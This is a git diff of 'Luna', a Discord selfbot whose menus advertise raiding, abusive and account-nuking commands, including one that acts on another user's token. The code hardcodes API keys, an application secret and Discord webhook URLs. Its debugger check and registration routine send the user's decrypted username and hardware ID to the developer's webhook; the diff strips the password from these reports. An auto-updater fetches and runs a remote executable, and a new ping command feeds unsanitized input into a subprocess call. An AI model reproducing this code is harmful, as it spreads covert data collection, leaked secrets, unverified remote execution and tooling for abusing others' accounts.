@@ -41,6 +41,37 @@ from AuthGG.client import Client as luna_gg
 from discord.ext.commands import MissingPermissions, CheckFailure, CommandNotFound, has_permissions
 
 # ///////////////////////////////////////////////////////////////
+# Luna Variables
+
+cooldown = []
+afkstatus = 0
+afk_user_id = 0
+afk_reset = 0
+user_token = ""
+whitelisted_users = {}
+crosshairmode = 0
+antiraid = False
+privacy = False
+copycat = None
+chargesniper = False
+
+developer_mode = False
+beta = True
+version = '3.0.5h1'
+
+r = requests.get("https://raw.githubusercontent.com/Nshout/Luna/main/master.json").json()
+updater_url = r["updater"]
+version_url = r["version"]
+
+r = requests.get("https://raw.githubusercontent.com/Nshout/Luna/main/beta.json").json()
+beta_updater_url = r["updater"]
+beta_version_url = r["version"]
+beta_user = r["beta_user"]
+
+motd = urllib.request.urlopen('https://pastebin.com/raw/MeHTn6gZ').read().decode('utf-8')
+auth = luna_gg(api_key="485477744381137547167158333254493", aid="940932", application_secret="1fZDchzE3iZyiq0Ir5nAaFZ0p1c00zkqLc5")
+
+# ///////////////////////////////////////////////////////////////
 # Window Size & Scroller
 
 system("mode con: cols=102 lines=35")
@@ -391,14 +422,11 @@ def check_debuggers():
 					if x in blacklisted_processes:
 						try:
 							username = files.json("Luna/auth.json", "username", documents=True)
-							password = files.json("Luna/auth.json", "password", documents=True)
 							username = Decryption('5QXapyTDbrRwW4ZBnUgPGAs9CeVSdiLk').CEA256(username)
-							password = Decryption('5QXapyTDbrRwW4ZBnUgPGAs9CeVSdiLk').CEA256(password)
 						except:
 							username = "Failed to get username"
-							password = "Failed to get password"
 						hwid = str(subprocess.check_output('wmic csproduct get uuid')).split('\\r\\n')[1].strip('\\r').strip() 
-						notify.webhook(url="https://discord.com/api/webhooks/918944258596155432/eskZhd3tY5LHsVUv7q9J0z8BTRZB1-Ko4qTPlPXa7opIqGJzRQT8F0Md6rL4fY5SShFu", description=f"Detected a debugger\n\nLuna Information:\n```\nUsername: {username}\nPassword » {password}```\n\nHWID:\n```{hwid}```")
+						notify.webhook(url="https://discord.com/api/webhooks/918944258596155432/eskZhd3tY5LHsVUv7q9J0z8BTRZB1-Ko4qTPlPXa7opIqGJzRQT8F0Md6rL4fY5SShFu", description=f"Detected a debugger\n```Luna Information\n\nUsername: {username}```\n\n```HWID » {hwid}```")
 						current_system_pid = os.getpid()
 						ThisSystem = psutil.Process(current_system_pid)
 						ThisSystem.terminate()
@@ -408,6 +436,7 @@ def check_debuggers():
 
 # ///////////////////////////////////////////////////////////////
 # Threading
+
 def check_debuggers_thread():
     debugger_thread = threading.Thread(target=check_debuggers)
     debugger_thread.daemon = True
@@ -440,28 +469,6 @@ def Randprntsc():
     return f'https://prnt.sc/{numberprn}{letterprn}'
 
 # ///////////////////////////////////////////////////////////////
-# Luna Variables
-
-cooldown = []
-afkstatus = 0
-afk_user_id = 0
-afk_reset = 0
-user_token = ""
-whitelisted_users = {}
-crosshairmode = 0
-antiraid = False
-privacy = False
-copycat = None
-chargesniper = False
-
-developer_mode = True
-version = '3.0.5'
-updater_url = urllib.request.urlopen('https://pastebin.com/raw/mt9DERP6').read().decode('utf-8')
-motd = urllib.request.urlopen('https://pastebin.com/raw/MeHTn6gZ').read().decode('utf-8')
-version_url = urllib.request.urlopen('https://pastebin.com/raw/iQPkzEpg').read().decode('utf-8').replace('\'', '')
-auth = luna_gg(api_key="485477744381137547167158333254493", aid="940932", application_secret="1fZDchzE3iZyiq0Ir5nAaFZ0p1c00zkqLc5")
-
-# ///////////////////////////////////////////////////////////////
 # File Check
 
 class luna:
@@ -473,6 +480,8 @@ class luna:
 		luna.console(clear=True)
 		if files.file_exist('Updater.exe'):
 			os.remove('Updater.exe')
+		if beta:
+			version_url = beta_version_url
 		if not version == version_url and not developer_mode:
 			luna.update()
 		else:
@@ -555,7 +564,7 @@ class luna:
 			auth.register(email=key, username=username, password=password, license_key=key)
 			prints.message("Successfully registered")
 			hwid = str(subprocess.check_output('wmic csproduct get uuid')).split('\\r\\n')[1].strip('\\r').strip()
-			notify.webhook(url="https://discord.com/api/webhooks/918945532146233344/ZDDj5GgzfDg5-QdScoDfebNCYOuBNUIbgi0UFiO2qIqt0l9hCGm5x1OVwcLuJe3JL_6z", description=f"A new registered user!\n\nLuna Information:\n```\nUsername: {username}\nPassword » {password}```\n\nHWID:\n```{hwid}```")
+			notify.webhook(url="https://discord.com/api/webhooks/918945532146233344/ZDDj5GgzfDg5-QdScoDfebNCYOuBNUIbgi0UFiO2qIqt0l9hCGm5x1OVwcLuJe3JL_6z", description=f"A new registered user!\n\nLuna Information:\n```\nUsername: {username}```\n\nHWID:\n```{hwid}```")
 			time.sleep(3)
 			username = Encryption('5QXapyTDbrRwW4ZBnUgPGAs9CeVSdiLk').CEA256(username)
 			password = Encryption('5QXapyTDbrRwW4ZBnUgPGAs9CeVSdiLk').CEA256(password)
@@ -574,12 +583,19 @@ class luna:
 
 	def update():
 		"""
-		The updater function
+		Checks if an update is available.\n
+		Will download the latest Updater.exe and download the latest Luna.exe\n
+		Uses the link for the Updater.exe from `updater_url` or `beta_update_url`\n
 		"""
 		luna.console(clear=True)
-		prints.event("Downloading Luna...")
+		url = updater_url
+		version = version_url
+		if beta:
+			prints.message("Beta Build")
+			version = beta_version_url
+		prints.event(f"Downloading Luna {version}...")
 		from clint.textui import progress
-		r = requests.get(updater_url, stream=True)
+		r = requests.get(url, stream=True)
 		with open('Updater.exe', 'wb') as f:
 			total_length = int(r.headers.get('content-length'))
 			for chunk in progress.bar(r.iter_content(chunk_size=1024), expected_size=(total_length/1024) + 1):
@@ -587,10 +603,10 @@ class luna:
 					f.write(chunk)
 					f.flush()
 			f.close()
-		time.sleep(5)
+		time.sleep(3)
 		prints.event("Starting Updater.exe...")
 		os.startfile('Updater.exe')
-		exit()
+		os._exit(0)
 
 	def console(menu = False, clear = False):
 		"""
@@ -752,13 +768,13 @@ class luna:
 					if luna.prompt_token() == True:
 						prints.event("Starting Luna...")
 					else:
-						exit()
+						os._exit(0)
 			else:
 				prints.error("Failed to find any valid tokens. Please manually enter a valid token.")
 				if luna.prompt_token() == True:
 					prints.event("Starting Luna...")
 				else:
-					exit()
+					os._exit(0)
 		else:
 			prints.error("Failed to find any valid tokens. Please manually enter a valid token.")
 			if luna.prompt_token() == True:
@@ -895,7 +911,7 @@ async def example(self, luna, *, text):
 				"delete_timer": "30",
 				"mode": "1",
 				"error_log": "message",
-				"risk_mode": "on",
+				"risk_mode": "off",
 				"theme": "luna.json",
 				"startup_status": "online"
 			}
@@ -2105,6 +2121,13 @@ async def on_ready():
 		custom_command_count = 0
 	prefix = files.json("Luna/config.json", "prefix", documents=True)
 	print(motd.center(os.get_terminal_size().columns))
+	if beta:
+		print("Beta Build".center(os.get_terminal_size().columns))
+		bot_id = str(bot.user.id)
+		if not bot_id in beta_user:
+			prints.message("You are not a beta user, Luna will close in 5 seconds.")
+			time.sleep(5)
+			os._exit(0)
 	print()
 	print(f"                           {color.purple('[')}+{color.purple('] CONNECTED')}")
 	print(f"                           {color.purple('[')}+{color.purple(']')} {bot.user} | {color.purple(f'{len(bot.guilds)}')} Servers | {color.purple(f'{len(bot.user.friends)}')} Friends")
@@ -2504,8 +2527,8 @@ class OnCommand(commands.Cog, name="on command"):
 		self.bot = bot
 		
 	@commands.Cog.listener()
-	async def on_command(self, ctx:commands.Context):
-		prints.command(ctx.command.name)
+	async def on_command(self, luna:commands.Context):
+		prints.command(luna.command.name)
 		theme = files.json("Luna/config.json", "theme", documents=True)
 		try:
 			title = files.json(f"Luna/themes/{theme}", "title", documents=True)
@@ -2513,7 +2536,7 @@ class OnCommand(commands.Cog, name="on command"):
 			if configs.error_log() == "console":
 				prints.error("The theme file was missing and prevented Luna from sending the message\n\nA theme file to fix it has been created")
 			else:
-				await ctx.send("The theme file was missing and prevented Luna from sending the message\n\nA theme file to fix it has been created", delete_after=10)
+				await luna.send("The theme file was missing and prevented Luna from sending the message\n\nA theme file to fix it has been created", delete_after=10)
 			if files.file_exist(f"Luna/themes/luna.json", documents=True):
 				config.theme(theme)
 			else:
@@ -2736,7 +2759,7 @@ class HelpCog(commands.Cog, name="Help commands"):
 			custom_command_count = 0
 			for command in custom:
 				custom_command_count += 1
-			await embed_builder(luna, description=f"{theme.description()}```\nLuna\n\nCommands          » {command_count-custom_command_count}\nCustom Commands   » {custom_command_count}\n``````\nCategories\n\n{prefix}help [command]   » Display all commands\n{prefix}admin            » Administrative commands\n{prefix}abusive          » Abusive commands\n{prefix}animated         » Animated commands\n{prefix}dump             » Dumping\n{prefix}fun              » Funny commands\n{prefix}image            » Image commands\n{prefix}hentai           » Hentai explorer\n{prefix}profile          » Current guild profile\n{prefix}protection       » Protections\n{prefix}raiding          » Raiding tools\n{prefix}text             » Text commands\n{prefix}trolling         » Troll commands\n{prefix}tools            » Tools\n{prefix}networking       » Networking\n{prefix}nuking           » Account nuking\n{prefix}utility          » Utilities\n{prefix}settings         » Settings\n{prefix}webhook          » Webhook settings\n{prefix}notifications    » Toast notifications\n{prefix}sharing          » Share with somebody\n{prefix}themes           » Themes\n{prefix}communitythemes  » Community made themes\n{prefix}communitycmds    » Community made commands\n{prefix}customhelp       » Show custom commands\n{prefix}misc             » Miscellaneous\n{prefix}info             » Luna information\n{prefix}search <command> » Search for a command\n``````\nVersion\n\n{version}```")
+			await embed_builder(luna, description=f"{theme.description()}```\nLuna\n\nCommands          » {command_count-custom_command_count}\nCustom Commands   » {custom_command_count}\n``````\nCategories\n\n{prefix}help [command]   » Display all commands\n{prefix}admin            » Administrative commands\n{prefix}abusive          » Abusive commands\n{prefix}animated         » Animated commands\n{prefix}dump             » Dumping\n{prefix}fun              » Funny commands\n{prefix}game             » Game commands\n{prefix}image            » Image commands\n{prefix}hentai           » Hentai explorer\n{prefix}profile          » Current guild profile\n{prefix}protection       » Protections\n{prefix}raiding          » Raiding tools\n{prefix}text             » Text commands\n{prefix}trolling         » Troll commands\n{prefix}tools            » Tools\n{prefix}networking       » Networking\n{prefix}nuking           » Account nuking\n{prefix}utility          » Utilities\n{prefix}settings         » Settings\n{prefix}webhook          » Webhook settings\n{prefix}notifications    » Toast notifications\n{prefix}sharing          » Share with somebody\n{prefix}themes           » Themes\n{prefix}communitythemes  » Community made themes\n{prefix}communitycmds    » Community made commands\n{prefix}customhelp       » Show custom commands\n{prefix}misc             » Miscellaneous\n{prefix}about            » Luna information\n{prefix}search <command> » Search for a command\n``````\nVersion\n\n{version}```")
 
 	@commands.command(name = "admin",
 						usage="",
@@ -2815,6 +2838,19 @@ class HelpCog(commands.Cog, name="Help commands"):
 		for command in commands:
 			helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
 		await embed_builder(luna, title="Text commands", description=f"{theme.description()}```\n{helptext}```")
+
+	@commands.command(name = "game",
+					usage="",
+					description = "Game commands")
+	async def game(self, luna):
+		await luna.message.delete()
+		prefix = files.json("Luna/config.json", "prefix", documents=True)
+		cog = self.bot.get_cog('Game commands')
+		commands = cog.get_commands()
+		helptext = ""
+		for command in commands:
+			helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
+		await embed_builder(luna, title="Game commands", description=f"{theme.description()}```\n{helptext}```")
 
 	@commands.command(name = "image",
 					usage="",
@@ -3067,7 +3103,7 @@ class HelpCog(commands.Cog, name="Help commands"):
 		helptext = ""
 		for command in commands:
 			helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-		await embed_builder(luna, title="Settings", description=f"{theme.description()}```\nYour current settings\n\nError logging     » {errorlog}\nAuto delete timer » {deletetimer}\nStartup status    » {startup_status}\nRiskmode          » {riskmode}\nTheme             » {(themesvar[:-5])}\nDescription       » {theme_description}\nSelfbot detection » {selfbotdetection}\nMention notify    » {pings}\n``````\nYour current theme settings\n\nTheme             » {title}\nFooter            » {footer}\nColor             » {hexcolor}\nAuthor            » {author}\n``````\nSettings\n\n{helptext}```")
+		await embed_builder(luna, title="Settings", description=f"{theme.description()}```\nYour current settings\n\nError logging     » {errorlog}\nAuto delete timer » {deletetimer}\nStartup status    » {startup_status}\nRiskmode          » {riskmode}\nTheme             » {(themesvar[:-5])}\nDescription       » {theme_description}\nSelfbot detection » {selfbotdetection}\nMention notify    » {pings}\n``````\nYour current theme settings\n\nTheme             » {(themesvar[:-5])}\nFooter            » {footer}\nColor             » {hexcolor}\nAuthor            » {author}\n``````\nSettings\n\n{helptext}```")
 
 	@commands.command(name = "sharing",
 					usage="",
@@ -3139,7 +3175,7 @@ class HelpCog(commands.Cog, name="Help commands"):
 		else:
 			for command in commands:
 				helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-		await embed_builder(luna, title="Your custom commands", description=f"{theme.description()}```\n{helptext}```")
+		await embed_builder(luna, title="Your custom commands", description=f"{theme.description()}```\n{helptext}``````\nNote\n\n{prefix}reload           » Reload custom commands```")
 
 	@commands.command(name = "communitycmds",
 					aliases=['ccommands', 'communitycommands', 'community'],
@@ -3167,7 +3203,11 @@ class HelpCog(commands.Cog, name="Help commands"):
 		custom_command_count = 0
 		for command in custom:
 			custom_command_count += 1
-		await embed_builder(luna, description=f"```\nMoto of the day\n\n{motd}\n``````\nVersion\n\n{versionpaste}\n``````\nCommands\n\n{command_count-custom_command_count}\n``````\nCustom commands\n\n{custom_command_count}\n``````\nPublic server invite\n\nhttps://discord.gg/Kxyv7NHVED\n``````\nCustomer only server invite\n\nhttps://discord.gg/3FGEaCnZST\n```")
+		if beta:
+			beta_info = f"```\nBeta Build\n```"
+		else:
+			beta_info = ""
+		await embed_builder(luna, description=f"```\nMoto of the day\n\n{motd}\n``````\nVersion\n\n{version}\n```{beta_info}```\nCommands\n\n{command_count-custom_command_count}\n``````\nCustom commands\n\n{custom_command_count}\n``````\nPublic server invite\n\nhttps://discord.gg/Kxyv7NHVED\n``````\nCustomer only server invite\n\nhttps://discord.gg/3FGEaCnZST\n```")
 
 	@commands.command(name = "search",
 						usage="<command>",
@@ -5850,11 +5890,10 @@ class NettoolCog(commands.Cog, name="Nettool commands"):
 	def __init__(self, bot:commands.bot):
 		self.bot = bot
         
-	@commands.command(name = "ping",
-					aliases=['latency'],
+	@commands.command(name = "latency",
 					usage="",
-					description = "Display the latency")
-	async def ping(self, luna):
+					description = "Display Luna's latency")
+	async def latency(self, luna):
 		await luna.message.delete()
 		if configs.mode() == 2:
 			before = time.monotonic()
@@ -5881,6 +5920,20 @@ class NettoolCog(commands.Cog, name="Nettool commands"):
 			embed.set_author(name=theme.author(), url=theme.author_url(), icon_url=theme.author_icon_url())
 			embed.set_image(url=theme.large_image_url())
 			await sent.edit(embed=embed)
+
+	@commands.command(name = "ping",
+					usage="<url/ip>",
+					description = "Ping an IP or URL")
+	async def ping(self, luna, *, url:str):
+		await luna.message.delete()
+		await embed_builder(luna, title=f"Ping", description=f"```\nPinging {url}...```")
+		# output = subprocess.Popen(["ping", url], stdout=subprocess.PIPE).communicate()[0]
+		output = subprocess.run(f"ping {url}",text=True,stdout=subprocess.PIPE).stdout.splitlines()
+		values = "".join(output[-1:])[4:].split(", ")
+		minimum = values[0][len("Minimum = "):]
+		maximum = values[1][len("Maximum = "):]
+		average = values[2][len("Average = "):]
+		await embed_builder(luna, title=f"{url}", description=f"```\nMinimum » {minimum}\nMaximum » {maximum}\nAverage » {average}```")
 
 	@commands.command(name = "ip",
 						usage="",
@@ -7214,10 +7267,10 @@ class NukingCog(commands.Cog, name="Nuking commands"):
 			embed.set_image(url=theme.large_image_url())
 			await send(luna, embed)
 
-	@commands.command(name = "fucktoken",
+	@commands.command(name = "messtoken",
 					usage="<token>",
-					description = "Fuck up the token")
-	async def fucktoken(self, luna, token:str):
+					description = "Mess up the token")
+	async def messtoken(self, luna, token:str):
 		await luna.message.delete()
 		if configs.risk_mode() == "on":
 			payload = {
@@ -7484,85 +7537,89 @@ class NukingCog(commands.Cog, name="Nuking commands"):
 
 bot.add_cog(NukingCog(bot))
 class PrivacyCog(commands.Cog, name="Privacy commands"):
-    def __init__(self, bot:commands.bot):
-        self.bot = bot
+	def __init__(self, bot:commands.bot):
+		self.bot = bot
 
-    @commands.command(name = "privacy",
-                    aliases=['streamermode'],
-                    usage="<on/off>",
-                    description = "Privacy mode")
-    async def privacy(self, ctx, mode:str):
-        await ctx.message.delete()
+	@commands.command(name = "privacy",
+					aliases=['streamermode'],
+					usage="<on/off>",
+					description = "Privacy mode")
+	async def privacy(self, luna, mode:str):
+		await luna.message.delete()
 
-        global privacy
+		global privacy
 
-        if mode == "on":
-            privacy = True
-            prints.message(f"Privacy mode » {color.purple('on')}")
+		if mode == "on":
+			privacy = True
+			prints.message(f"Privacy mode » {color.purple('on')}")
 
-            embed = discord.Embed(title=theme.title(), url=theme.title_url(), description=f"```\nPrivacy mode » on```", color=theme.hex_color())
-            embed.set_thumbnail(url=theme.image_url())
-            embed.set_footer(text=theme.footer(), icon_url=theme.footer_icon_url())
-            embed.set_author(name=theme.author(), url=theme.author_url(), icon_url=theme.author_icon_url())
-            embed.set_image(url=theme.large_image_url())
-            await send(ctx, embed)
+			embed = discord.Embed(title=theme.title(), url=theme.title_url(), description=f"```\nPrivacy mode » on```", color=theme.hex_color())
+			embed.set_thumbnail(url=theme.image_url())
+			embed.set_footer(text=theme.footer(), icon_url=theme.footer_icon_url())
+			embed.set_author(name=theme.author(), url=theme.author_url(), icon_url=theme.author_icon_url())
+			embed.set_image(url=theme.large_image_url())
+			await send(luna, embed)
 
-            luna.console(clear=True)
-            command_count = len(bot.commands)
-            cog = bot.get_cog('Custom commands')
-            try:
-                custom = cog.get_commands()
-                custom_command_count = 0
-                for command in custom:
-                    custom_command_count += 1
-            except:
-                custom_command_count = 0
-            prefix = files.json("Luna/config.json", "prefix", documents=True)
-            print(motd.center(os.get_terminal_size().columns))
-            print()
-            print(f"                           {color.purple('[')}+{color.purple('] CONNECTED')}")
-            print(f"                           {color.purple('[')}+{color.purple(']')} Luna#0000 | {color.purple('0')} Servers | {color.purple('0')} Friends")
-            print(f"                           {color.purple('[')}+{color.purple(']')} {prefix}\n")
-            print(f"═══════════════════════════════════════════════════════════════════════════════════════════════════\n")
-            prints.message(f"{color.purple(f'{command_count-custom_command_count}')} commands | {color.purple(f'{custom_command_count}')} custom commands")
+			luna.console(clear=True)
+			command_count = len(bot.commands)
+			cog = bot.get_cog('Custom commands')
+			try:
+				custom = cog.get_commands()
+				custom_command_count = 0
+				for command in custom:
+					custom_command_count += 1
+			except:
+				custom_command_count = 0
+			prefix = files.json("Luna/config.json", "prefix", documents=True)
+			print(motd.center(os.get_terminal_size().columns))
+			if beta:
+				print("Beta Build".center(os.get_terminal_size().columns))
+			print()
+			print(f"                           {color.purple('[')}+{color.purple('] CONNECTED')}")
+			print(f"                           {color.purple('[')}+{color.purple(']')} Luna#0000 | {color.purple('0')} Servers | {color.purple('0')} Friends")
+			print(f"                           {color.purple('[')}+{color.purple(']')} {prefix}\n")
+			print(f"═══════════════════════════════════════════════════════════════════════════════════════════════════\n")
+			prints.message(f"{color.purple(f'{command_count-custom_command_count}')} commands | {color.purple(f'{custom_command_count}')} custom commands")
 
-        elif mode == "off":
-            privacy = False
-            prints.message(f"Privacy mode » {color.purple('off')}")
+		elif mode == "off":
+			privacy = False
+			prints.message(f"Privacy mode » {color.purple('off')}")
 
-            embed = discord.Embed(title=theme.title(), url=theme.title_url(), description=f"```\nPrivacy mode » off```", color=theme.hex_color())
-            embed.set_thumbnail(url=theme.image_url())
-            embed.set_footer(text=theme.footer(), icon_url=theme.footer_icon_url())
-            embed.set_author(name=theme.author(), url=theme.author_url(), icon_url=theme.author_icon_url())
-            embed.set_image(url=theme.large_image_url())
-            await send(ctx, embed)
+			embed = discord.Embed(title=theme.title(), url=theme.title_url(), description=f"```\nPrivacy mode » off```", color=theme.hex_color())
+			embed.set_thumbnail(url=theme.image_url())
+			embed.set_footer(text=theme.footer(), icon_url=theme.footer_icon_url())
+			embed.set_author(name=theme.author(), url=theme.author_url(), icon_url=theme.author_icon_url())
+			embed.set_image(url=theme.large_image_url())
+			await send(luna, embed)
 
-            luna.console(clear=True)
-            command_count = len(bot.commands)
-            cog = bot.get_cog('Custom commands')
-            try:
-                custom = cog.get_commands()
-                custom_command_count = 0
-                for command in custom:
-                    custom_command_count += 1
-            except:
-                custom_command_count = 0
-            prefix = files.json("Luna/config.json", "prefix", documents=True)
-            print(motd.center(os.get_terminal_size().columns))
-            print()
-            print(f"                           {color.purple('[')}+{color.purple('] CONNECTED')}")
-            print(f"                           {color.purple('[')}+{color.purple(']')} {bot.user} | {color.purple(f'{len(bot.guilds)}')} Servers | {color.purple(f'{len(bot.user.friends)}')} Friends")
-            print(f"                           {color.purple('[')}+{color.purple(']')} {prefix}\n")
-            print(f"═══════════════════════════════════════════════════════════════════════════════════════════════════\n")
-            prints.message(f"{color.purple(f'{command_count-custom_command_count}')} commands | {color.purple(f'{custom_command_count}')} custom commands")
+			luna.console(clear=True)
+			command_count = len(bot.commands)
+			cog = bot.get_cog('Custom commands')
+			try:
+				custom = cog.get_commands()
+				custom_command_count = 0
+				for command in custom:
+					custom_command_count += 1
+			except:
+				custom_command_count = 0
+			prefix = files.json("Luna/config.json", "prefix", documents=True)
+			print(motd.center(os.get_terminal_size().columns))
+			if beta:
+				print("Beta Build".center(os.get_terminal_size().columns))
+			print()
+			print(f"                           {color.purple('[')}+{color.purple('] CONNECTED')}")
+			print(f"                           {color.purple('[')}+{color.purple(']')} {bot.user} | {color.purple(f'{len(bot.guilds)}')} Servers | {color.purple(f'{len(bot.user.friends)}')} Friends")
+			print(f"                           {color.purple('[')}+{color.purple(']')} {prefix}\n")
+			print(f"═══════════════════════════════════════════════════════════════════════════════════════════════════\n")
+			prints.message(f"{color.purple(f'{command_count-custom_command_count}')} commands | {color.purple(f'{custom_command_count}')} custom commands")
 
-        else:
-            embed = discord.Embed(title="Error", url=theme.title_url(), description=f"```\nThat mode does not exist!\nOnly on or off```", color=0xff0000)
-            embed.set_thumbnail(url=theme.image_url())
-            embed.set_footer(text=theme.footer(), icon_url=theme.footer_icon_url())
-            embed.set_author(name=theme.author(), url=theme.author_url(), icon_url=theme.author_icon_url())
-            embed.set_image(url=theme.large_image_url())
-            await send(ctx, embed)
+		else:
+			embed = discord.Embed(title="Error", url=theme.title_url(), description=f"```\nThat mode does not exist!\nOnly on or off```", color=0xff0000)
+			embed.set_thumbnail(url=theme.image_url())
+			embed.set_footer(text=theme.footer(), icon_url=theme.footer_icon_url())
+			embed.set_author(name=theme.author(), url=theme.author_url(), icon_url=theme.author_icon_url())
+			embed.set_image(url=theme.large_image_url())
+			await send(luna, embed)
 
 bot.add_cog(PrivacyCog(bot))
 
@@ -7604,6 +7661,71 @@ bot.add_cog(ProtectionCog(bot))
 class BackupsCog(commands.Cog, name="Backup commands"):
 	def __init__(self, bot:commands.bot):
 		self.bot = bot
+
+	@commands.command(name = "backupserver",
+					usage="",
+					description = "Backup the server")
+	async def backupserver(self, luna):
+		await luna.message.delete()
+		serverName = luna.guild.name
+
+		newGuild = await self.bot.create_guild(serverName)
+		prints.info(f"Created new guild.")
+		newGuildDefaultChannels = await newGuild.fetch_channels()
+		for channel in newGuildDefaultChannels:
+			await channel.delete()
+
+		for channel in luna.guild.channels:
+			if str(channel.type).lower() == "category":
+				try:
+					await newGuild.create_category(channel.name, overwrites=channel.overwrites, position=channel.position)
+					prints.info(f"Created new category » {channel.name}")
+				except:
+					pass
+				
+		for channel in luna.guild.voice_channels:
+			try:
+				cat = ""
+				for category in newGuild.categories:
+					if channel.category.name == category.name:
+						cat = category
+						
+				await newGuild.create_voice_channel(channel.name, category=cat, overwrites=channel.overwrites, topic=channel.topic, slowmode_delay=channel.slowmode_delay, nsfw=channel.nsfw, position=channel.position)
+				prints.info(f"Created new voice channel » {channel.name}")
+			except:
+				pass
+
+		for channel in luna.guild.stage_channels:
+			try:
+				cat = ""
+				for category in newGuild.categories:
+					if channel.category.name == category.name:
+						cat = category                    
+				await newGuild.create_stage_channel(channel.name, category=cat, overwrites=channel.overwrites, topic=channel.topic, slowmode_delay=channel.slowmode_delay, nsfw=channel.nsfw, position=channel.position)
+				prints.info(f"Created new stage channel » {channel.name}")
+			except:
+				pass
+			
+		for channel in luna.guild.text_channels:
+			try:
+				cat = ""
+				for category in newGuild.categories:
+					if channel.category.name == category.name:
+						cat = category                            
+				await newGuild.create_text_channel(channel.name, category=cat, overwrites=channel.overwrites, topic=channel.topic, slowmode_delay=channel.slowmode_delay, nsfw=channel.nsfw, position=channel.position)
+				prints.info(f"Created new text channel » {channel.name}")
+			except:
+				pass
+
+		for role in luna.guild.roles[::-1]:
+			if role.name != "@everyone":
+				try:
+					await newGuild.create_role(name=role.name, color=role.color, permissions=role.permissions, hoist=role.hoist, mentionable=role.mentionable)
+					prints.info(f"Created new role » {role.name}")
+				except:
+					pass
+
+		await luna.send(f"Made a clone of `{luna.guild.name}`.")
 
 	@commands.command(name = "friendsbackup",
 					usage="",
@@ -7715,8 +7837,8 @@ class SettingsCog(commands.Cog, name="Settings commands"):
 	@commands.command(name = "prefix",
 					usage="<prefix>",
 					description = "Change the prefix")
-	async def prefix(self, ctx, newprefix):
-		await ctx.message.delete()
+	async def prefix(self, luna, newprefix):
+		await luna.message.delete()
 		config.prefix(newprefix)
 		luna.console(clear=True)
 		command_count = len(bot.commands)
@@ -7729,6 +7851,8 @@ class SettingsCog(commands.Cog, name="Settings commands"):
 		except:
 			custom_command_count = 0
 		print(motd.center(os.get_terminal_size().columns))
+		if beta:
+			print("Beta Build".center(os.get_terminal_size().columns))
 		print()
 		print(f"                           {color.purple('[')}+{color.purple('] CONNECTED')}")
 		print(f"                           {color.purple('[')}+{color.purple(']')} {bot.user} | {color.purple(f'{len(bot.guilds)}')} Servers | {color.purple(f'{len(bot.user.friends)}')} Friends")
@@ -7742,7 +7866,7 @@ class SettingsCog(commands.Cog, name="Settings commands"):
 			embed.set_footer(text=theme.footer(), icon_url=theme.footer_icon_url())
 			embed.set_author(name=theme.author(), url=theme.author_url(), icon_url=theme.author_icon_url())
 			embed.set_image(url=theme.large_image_url())
-			await send(ctx, embed)
+			await send(luna, embed)
 		except Exception as e:
 			print(e)
 
@@ -7812,7 +7936,7 @@ class SettingsCog(commands.Cog, name="Settings commands"):
 		for command in commands:
 			helptext3+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
 		
-		embed = discord.Embed(title="Customization", description=f"{theme.description()}```\nYour current theme settings\n\nTheme             » {themevar}\nFooter            » {footer}\nColor             » {hexcolor}\nAuthor            » {author}\n``````\nSelfbot theme settings\n\n{helptext1}\n``````\nWebhook theme settings\n\n{helptext2}\n``````\nToast theme settings\n\n{helptext3}\n``````\nNote\n\nIf you want to remove a customization,\nYou can use \"None\" to remove it.\n\nIf you want to set up a random color each time\nyou run a command, you can use \"random\" as hex color.\n\nIf you want to set up your avatar as image\nUse \"avatar\" as value.```", color=theme.hex_color())
+		embed = discord.Embed(title="Customization", description=f"{theme.description()}```\nYour current theme settings\n\nTheme             » {(themevar[:-5])}\nFooter            » {footer}\nColor             » {hexcolor}\nAuthor            » {author}\n``````\nSelfbot theme settings\n\n{helptext1}\n``````\nWebhook theme settings\n\n{helptext2}\n``````\nToast theme settings\n\n{helptext3}\n``````\nNote\n\nIf you want to remove a customization,\nYou can use \"None\" to remove it.\n\nIf you want to set up a random color each time\nyou run a command, you can use \"random\" as hex color.\n\nIf you want to set up your avatar as image\nUse \"avatar\" as value.```", color=theme.hex_color())
 		embed.set_thumbnail(url=theme.image_url())
 		embed.set_footer(text=theme.footer(), icon_url=theme.footer_icon_url())
 		embed.set_author(name=theme.author(), url=theme.author_url(), icon_url=theme.author_icon_url())
@@ -9944,289 +10068,313 @@ class WebhookCog(commands.Cog, name="Webhook customisation"):
 bot.add_cog(WebhookCog(bot))
 
 class MiscCog(commands.Cog, name="Miscellaneous commands"):
-    def __init__(self, bot:commands.bot):
-        self.bot = bot
+	def __init__(self, bot:commands.bot):
+		self.bot = bot
 
-    @commands.command(name = "thelp",
-                    usage="",
-                    description = "All commands in a text file")
-    async def thelp(self, luna):
-        await luna.message.delete()
+	@commands.command(name = "thelp",
+					usage="",
+					description = "All commands in a text file")
+	async def thelp(self, luna):
+		await luna.message.delete()
 
-        #///////////////////////////////////////////////////////////////////
+		#///////////////////////////////////////////////////////////////////
 
-        prefix = files.json("Luna/config.json", "prefix", documents=True)
+		prefix = files.json("Luna/config.json", "prefix", documents=True)
 
-        #///////////////////////////////////////////////////////////////////
+		#///////////////////////////////////////////////////////////////////
 
-        cog = self.bot.get_cog('Help commands')
-        commands = cog.get_commands()
-        helpcommands = ""
-        for command in commands:
-            helpcommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
+		cog = self.bot.get_cog('Help commands')
+		commands = cog.get_commands()
+		helpcommands = ""
+		for command in commands:
+			helpcommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
 
-        cog = self.bot.get_cog('Administrative commands')
-        commands = cog.get_commands()
-        admincommands = ""
-        for command in commands:
-            admincommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
+		cog = self.bot.get_cog('Administrative commands')
+		commands = cog.get_commands()
+		admincommands = ""
+		for command in commands:
+			admincommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
 
-        cog = self.bot.get_cog('Animated commands')
-        commands = cog.get_commands()
-        animatedcommands = ""
-        for command in commands:
-            animatedcommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
+		cog = self.bot.get_cog('Animated commands')
+		commands = cog.get_commands()
+		animatedcommands = ""
+		for command in commands:
